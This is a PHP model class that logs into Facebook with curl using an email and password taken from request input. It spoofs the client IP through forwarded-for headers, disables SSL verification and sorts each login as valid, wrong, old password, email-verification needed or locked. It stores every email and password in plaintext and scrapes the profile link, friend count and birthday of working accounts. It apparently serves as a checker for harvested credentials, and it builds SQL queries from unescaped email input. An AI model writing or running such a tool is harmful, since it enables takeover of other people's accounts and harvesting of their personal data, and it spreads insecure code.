<?php
namespace Home\Model;
use Think\Model;
Vendor('phpQuery',VENDOR_PATH.'phpQuery');
Vendor('simple_html_dom',VENDOR_PATH.'simple_html_dom');


/**
* FaceBook
*
*/
class FaceBookModel extends Model
{
	public $base_url   = 'https://www.facebook.com/';
	public $email  = null;
	public $curl_opts = null;
	public $profile_href = null;

	/**
	* 构造函数
	*
	*/
    public function __construct(){
    	$this->email = I('email');
        $cookie_file = CACHE_PATH.'/Cookie/'.$this->email;

		$this->curl_opts    = array(
			CURLOPT_COOKIEJAR      => $cookie_file,
			CURLOPT_COOKIEFILE     => $cookie_file,
			CURLOPT_USERAGENT	   => 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36',
			CURLOPT_SSL_VERIFYPEER => false,
			CURLOPT_SSL_VERIFYHOST => 0,
			CURLOPT_REFERER		   => 'https://www.facebook.com/',
			CURLOPT_AUTOREFERER	   => true,
			CURLOPT_CONNECTTIMEOUT => 10,
			CURLOPT_RETURNTRANSFER => 1,
			CURLOPT_HEADER		   => 0,
			);
    	if (!empty(I('ip'))) {
    		$ip = I('ip');
    		$header = array('CLIENT-IP:'.$ip, 'X-FORWARDED-FOR:'.$ip );
    		$this->curl_opts[CURLOPT_HTTPHEADER] = $header;
    	}
    	parent::__construct();
    }
	/**
	* 模拟登录
	* @param string 
	* @param string 
	* @return array
	*/
	public function login(){
		$rv['login_status'] = 1;
		$rv['login_msg']    = '正确账号';
		$pass	  = I('pass');
		if (empty($this->email) || empty($pass)) {
			return false;
		}

		$query = array(
			'email'=>$this->email,
			'pass'=>$pass,
			'persistent'=>1,
			);
		// foreach ($query as $key => $value) {
		// 	$query[$key] = urlencode($value);
		// }
		// $query = http_build_query($query);

		// 必须带上这个cookie，facebook用来检测是否时通过浏览器登录的
		$cookie = 'fb_gate=https%3A%2F%2Fwww.facebook.com%2F; _js_reg_fb_ref=https%3A%2F%2Fwww.facebook.com%2F';
		$login_opts = $this->curl_opts;
		$login_opts[CURLOPT_URL]	 	 = $this->base_url.'login.php?login_attempt=1&lwv=110';
		$login_opts[CURLOPT_POST]		 = true;
		$login_opts[CURLOPT_POSTFIELDS]	 = $query;
		$login_opts[CURLOPT_COOKIE]   	 = $cookie;
		$login_opts[CURLOPT_HEADER]		 = 1;

		$ch = curl_init();
		curl_setopt_array($ch,$login_opts);
		$content = curl_exec($ch);
		curl_close($ch);

		file_put_contents(CACHE_PATH.'Login/'.$this->email.'.html', $content);

		$pos = strripos($content, 'HTTP/1.1');
		$content = substr($content, $pos);
		$res = substr($content, 9,3);
		switch ($res) {
			case '200':
				$data = array();
				$data['email'] = $this->email;
				$data['pass']     = $pass;
				$data['login_status']   = -1;
	  			$this->add($data,array(),true);
	  			$rv['login_status'] = -1;
	  			$rv['login_msg']    = '错误账号';
				break;
			case '302':
				$data = array();
				$data['email'] = $this->email;
				$data['pass']     = $pass;

				$num = preg_match_all("/set-cookie/i", $content);
				if ($num < 4) {
					$data['login_status']   = 2;
		  			$rv['login_status'] 	= 2;
		  			$rv['login_msg']    	= '锁号';
				}else{
					preg_match('/Location[\s\S]*facebook\.com\/([\s\S]*)X-Content-Type-Options/i', $content,$matches);
					if (isset($matches[1])&&!empty($matches[1])) {
						$data['login_status']   = 3;
			  			$rv['login_status'] 	= 3;
			  			$rv['login_msg']    	= '验证邮箱';
					}else{
						$data['login_status']   = 1;
					}
				}
	            //$query = "INSERT INTO __PREFIX__face_book (email,pass,login_status) VALUES ('". $data['email']."','".$data['pass']."',".$data['login_status']. ") ON DUPLICATE KEY UPDATE login_status=".$data['login_status'];
	  			$this->add($data,array(),true);
				break;
			
			default:
				$data = array();
				$data['email'] = $this->email;
				$data['pass']     = $pass;
				$data['login_status']   = 5;
	  			$this->add($data,array(),true);
	  			$rv['login_status'] = 5;
	  			$rv['login_msg']    = '未知错误';
				break;
		}

		return $rv;
	}
	

	/**
	* 抓取用户profile_href
	* @return string/bool
	*/
	public function catchProfileURI(){
		$capt_opts = $this->curl_opts;
		$capt_opts[CURLOPT_URL] =  $this->base_url;
		$ch = curl_init();
		curl_setopt_array($ch, $capt_opts);
		$content = curl_exec($ch);
		curl_close($ch);
		// $content = file_get_contents(CACHE_PATH.'page.html');

		// profile_href
		\phpQuery::newDocument($content);
		$this->profile_href = pq("div [data-click='profile_icon'] a")->attr('href');

		if(empty($this->profile_href)){
			return false;
		}else{
	        $data = array();
			$data['profile_href']  = $this->profile_href;
			$this->where("`email` = '".$this->email."'")->save($data);
			return $this->profile_href;
		}
		// preg_match( "/https:\/\/www.facebook.com\/([\s\S]+)\.([\s\S]+)\.([0-9]+)/",$href,$matches);
		// if (empty($matches[1])) {
		// 	return flase;
		// }else{
		// 	$data = array();
		// 	$data['first_name']  = $matches[1];
		// 	$data['last_name'] = $matches[2];
		// 	$data['user_id']	= $matches[3];
		// 	$this->where('email = '.$this->email)->save($data);
		// 	return true;
		// }
	}
	
	/**
	* 抓取好友数量
	* @return int
	*/
	public function catchFriendsNum(){
		$capt_opts = $this->curl_opts;
		$capt_opts[CURLOPT_URL] =  $this->profile_href;
		$ch = curl_init();
		curl_setopt_array($ch, $capt_opts);
		$content = curl_exec($ch);
		curl_close($ch);
		$content = str_replace('<!--', '', $content);
		$content = str_replace('-->','',$content);
        // file_put_contents(CACHE_PATH.$this->email.'--friends.html',$content);
		\phpQuery::newDocumentHTML($content);
		$friends_num = pq("._gs6")->text();

		$data = array();
		$data['friends_num']  = $friends_num;
		$this->where("`email` = '".$this->email."'")->save($data);
		return $friends_num;
	}

	/**
	* 抓取用户生日
	* @return string
	*/
	public function catchBirthday(){
		$capt_opts = $this->curl_opts;
		$capt_opts[CURLOPT_URL] =  $this->profile_href.'/about';
		$ch = curl_init();
		curl_setopt_array($ch, $capt_opts);
		$content = curl_exec($ch);
		curl_close($ch);
		$content = str_replace('<!--', '', $content);
		$content = str_replace('-->',  '', $content);
        // file_put_contents(CACHE_PATH.$this->email.'--birthday.html',$content);
		// $content = file_get_contents(CACHE_PATH.'birthday.html');
		\phpQuery::newDocumentHTML($content);
		$birthday = pq("._4tnv._2pif:has('.img.sp_owM48kRhARK.sx_83c411') span>div:last")->text();

		$data = array();
		$data['birthday'] = $birthday;
		$this->where("`email` = '".$this->email."'")->save($data);
		return $birthday;
	}

	/**
	* 确认所有好友请求
	*
	*/
	public function acceptFriend(){
		$capt_opts = $this->curl_opts;
		$capt_opts[CURLOPT_URL] =  $this->base_url.'friends/requests/?fcref=jwl';
		$ch = curl_init();
		curl_setopt_array($ch, $capt_opts);
		$content = curl_exec($ch);
		curl_close($ch);
		file_put_contents(CACHE_PATH.'request.html', $content);
	}

	/**
	* 添加好友
	* 
	*/
	public function addFriends(){

	}	

	/**
	* 模拟登录，测试版本
	* @param string 
	* @param string 
	* @return array -1/1/2/3/4/5 登录失败/成功/旧密码/验证邮箱/锁号/未知错误
	*/
	public function loginTest(){
		$rv['login_status'] = 1;
		$rv['login_msg']    = '正确账号';
		$pass	  = I('pass');
		if (empty($this->email) || empty($pass)) {
			return false;
		}

		$query = array(
			'email'=>$this->email,
			'pass'=>$pass,
			'persistent'=>1,
			);
		// foreach ($query as $key => $value) {
		// 	$query[$key] = urlencode($value);
		// }
		// $query = http_build_query($query);

		// 必须带上这个cookie，facebook用来检测是否时通过浏览器登录的
		$cookie = 'fb_gate=https%3A%2F%2Fwww.facebook.com%2F; _js_reg_fb_ref=https%3A%2F%2Fwww.facebook.com%2F';
		$login_opts = $this->curl_opts;
		$login_opts[CURLOPT_URL]	 	 = $this->base_url.'login.php?login_attempt=1&lwv=110';
		$login_opts[CURLOPT_POST]		 = true;
		$login_opts[CURLOPT_POSTFIELDS]	 = $query;
		$login_opts[CURLOPT_COOKIE]   	 = $cookie;
		$login_opts[CURLOPT_HEADER]		 = 1;

		$ch = curl_init();
		curl_setopt_array($ch,$login_opts);
		$content = curl_exec($ch);
		curl_close($ch);

		// file_put_contents(CACHE_PATH.'Login/'.$this->email.'.html', $content);

		$res = substr($content, 9,3);
		switch ($res) {
			case '200':
				$data = array();
				$data['email'] = $this->email;
				$data['pass']     = $pass;
				$data['login_status']   = -1;
	  			$this->add($data,array(),true);
	  			$rv['login_status'] = -1;
	  			$rv['login_msg']    = '错误账号';
				break;
			case '302':
				$data = array();
				$data['email'] = $this->email;
				$data['pass']     = $pass;
				$data['login_status']   = 1;
	            //$query = "INSERT INTO __PREFIX__face_book (email,pass,login_status) VALUES ('". $data['email']."','".$data['pass']."',".$data['login_status']. ") ON DUPLICATE KEY UPDATE login_status=".$data['login_status'];
	  			$this->add($data,array(),true);
				break;
			case '100':
				$str = stristr($content, 'HTTP/1.1 200 OK');
				if ($str !== false) {
					$data = array();
					$data['email'] = $this->email;
					$data['pass']     = $pass;
					$data['login_status']   = 2;
		  			$this->add($data,array(),true);
		  			$rv['login_status'] = 2;
		  			$rv['login_msg']    = '输入的是旧密码';
				}else{
					$num = preg_match_all("/set-cookie/i", $content);
					if ($num >4) {
						$data = array();
						$data['email'] = $this->email;
						$data['pass']     = $pass;
						$data['login_status']   = 3;
			  			$this->add($data,array(),true);
			  			$rv['login_status'] = 3;
			  			$rv['login_msg']    = '需要验证邮箱';
					}else{
						$data = array();
						$data['email'] = $this->email;
						$data['pass']     = $pass;
						$data['login_status']   = 4;
			  			$this->add($data,array(),true);
			  			$rv['login_status'] = 4;
			  			$rv['login_msg']    = '锁号';
					}
				}
				break;
			default:
				$data = array();
				$data['email'] = $this->email;
				$data['pass']     = $pass;
				$data['login_status']   = 5;
	  			$this->add($data,array(),true);
	  			$rv['login_status'] = 5;
	  			$rv['login_msg']    = '未知错误';
				break;
		}

		return $rv;
	}
}